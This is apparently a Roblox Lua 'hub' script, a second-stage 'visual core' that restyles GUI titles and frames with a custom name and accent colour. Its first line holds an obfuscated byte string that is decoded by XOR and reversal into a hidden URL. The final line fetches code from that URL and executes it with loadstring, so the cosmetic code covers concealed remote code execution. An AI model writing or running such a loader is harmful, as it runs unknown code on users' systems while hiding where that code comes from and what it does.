
--[[ STAGE 2: VISUAL CORE ]]
local ePezVkMFjdtz0="\075\122\116\113\146\133\129\138\090\086\087\046\068\112\146\083\084\090\044\104\034\081\080\042\039\124\054\035\032\051\114\012\008\009\000\054\034\070\068\066\027\029\000\023\002\048\084\233\017\236\233\055\040\237\255\250\254\024\058\054\012\013\048\250\243\201\201\194\227\004\196\192\202\031\215\219\192\209\213\208\218\171\212\164\160\211\188\169\187\162\162\251\142\162\177\240\206\195\134\137\131\129\139"local K5PaJ1taI2fUnu=238 local IdbW5VyeugXZDYRP7JihFr=47 local R4I5jQu4E8A12oe=1 local xL5BlZghhduo=2 local _Jn7HgHMdVmiShTSit5=0 local uuHHTKYhQSQreHD8iXy=true local nid_T71gwNoJo=bit32 and bit32.bxor if not nid_T71gwNoJo then nid_T71gwNoJo=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local g6tQrkCpmGNgLe8zi={}for VhUe3FGmfyghT0=1,#ePezVkMFjdtz0 do local ka8DihlypFyahW0_Hmqq3=string.byte(ePezVkMFjdtz0,VhUe3FGmfyghT0)local vBZD0RXNhQVGBCmoahle1=(IdbW5VyeugXZDYRP7JihFr+(VhUe3FGmfyghT0*xL5BlZghhduo)+_Jn7HgHMdVmiShTSit5)%256 if R4I5jQu4E8A12oe==0 then ka8DihlypFyahW0_Hmqq3=(ka8DihlypFyahW0_Hmqq3-vBZD0RXNhQVGBCmoahle1)%256 g6tQrkCpmGNgLe8zi[VhUe3FGmfyghT0]=string.char(nid_T71gwNoJo(ka8DihlypFyahW0_Hmqq3,K5PaJ1taI2fUnu))else ka8DihlypFyahW0_Hmqq3=nid_T71gwNoJo(ka8DihlypFyahW0_Hmqq3,K5PaJ1taI2fUnu)g6tQrkCpmGNgLe8zi[VhUe3FGmfyghT0]=string.char((ka8DihlypFyahW0_Hmqq3-vBZD0RXNhQVGBCmoahle1)%256)end end local pEHfWsLigaNHEJo=table.concat(g6tQrkCpmGNgLe8zi)if uuHHTKYhQSQreHD8iXy then pEHfWsLigaNHEJo=string.reverse(pEHfWsLigaNHEJo)end local VuN0s29ytQKLijIGCxDAnW=pEHfWsLigaNHEJo
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(VuN0s29ytQKLijIGCxDAnW))()
